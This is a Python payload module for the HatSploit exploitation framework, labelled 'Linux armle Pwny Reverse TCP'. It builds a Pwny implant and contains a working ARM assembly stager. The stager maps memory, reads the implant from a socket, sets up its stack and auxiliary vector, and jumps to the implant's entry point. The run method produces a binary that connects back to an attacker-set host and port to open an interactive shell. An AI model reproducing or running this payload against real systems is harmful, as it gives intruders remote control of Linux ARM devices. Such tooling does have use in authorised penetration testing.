
"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import io

from pwny import Pwny
from pwny.session import PwnySession

from elftools.elf.elffile import ELFFile

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux armle Pwny Reverse TCP",
            'Payload': "linux/armle/pwny_reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive reverse Pwny shell for Linux
                with ARM little-endian architecture.
            """,
            'Arch': ARCH_ARMLE,
            'Platform': OS_LINUX,
            'Session': PwnySession,
            'Type': REVERSE_TCP,
        })

    def stage(self):
        implant = self.implant()
        length = len(implant)
        entry = ELFFile(io.BytesIO(implant)).header['e_entry']

        return self.__asm__(
            f"""
            start:
                mov r0, 0
                ldr r1, ={hex(length)}
                mov r2, 7
                mov r3, 34
                mov r4, 0
                mov r5, 0

                mov r7, 192
                svc 0

                mov r2, r1
                mov r1, r0
                mov r0, ip
                mov r3, 0x100
                ldr r7, =291
                svc 0

            #################################################
            ##
            ##    +----------------------------------+ low
            ##    |              ARGC                |
            ##    |----------------------------------|
            ##    |           ARGV[0] = p            |
            ##    |----------------------------------|
            ##    |         ARGV[1] = sock           |
            ##    |----------------------------------|
            ##    |         NULL (ends ARGV)         |
            ##    |----------------------------------|
            ##    |          ENV strings             |
            ##    |----------------------------------|
            ##    |         NULL (ends ENV)          |
            ##    |----------------------------------|
            ##    |           AT_BASE (7)            |
            ##    |----------------------------------|
            ##    |   address of pwny binary image   |
            ##    |----------------------------------|
            ##    |           AT_NULL (0)            |
            ##    |----------------------------------|
            ##    |         NULL (ends AUXV)         |
            ##    +----------------------------------+ high
            ##
            #################################################

                sub sp, 16
                add sp, 36 + 4
                mov r4, 112
                push {{r4}}
                mov r4, 2
                mov r5, sp
                mov r6, ip
                mov r7, 0
                mov r8, 0
                mov r9, 7
                mov r10, r1
                mov r11, 0
                mov r12, 0
                push {r4 - r12}

                ldr r0, ={hex(entry)}
                add r0, r1
                bx r0
            """
        )

    def implant(self):
        return Pwny(
            target='armv5l-linux-musleabi',
        ).to_binary('bin')

    def run(self):
        return Pwny(
            target='armv5l-linux-musleabi',
            options={
                'uri': f'tcp://{self.rhost.value}:{str(self.rport.value)}'
            }
        ).to_binary()
